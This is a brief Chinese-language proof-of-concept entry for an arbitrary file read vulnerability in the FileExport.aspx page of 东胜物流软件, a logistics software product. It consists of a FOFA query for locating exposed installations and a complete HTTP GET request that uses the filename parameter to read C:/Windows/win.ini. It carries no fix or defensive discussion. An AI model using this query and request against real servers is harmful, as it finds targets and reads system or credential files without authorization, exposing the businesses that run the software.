东胜物流软件 FileExport.aspx 存在任意文件读取漏洞



fofa



app="东胜物流软件-物流软件"



poc



GET /Reports/FileExport.aspx?filename=C:/Windows/win.ini HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
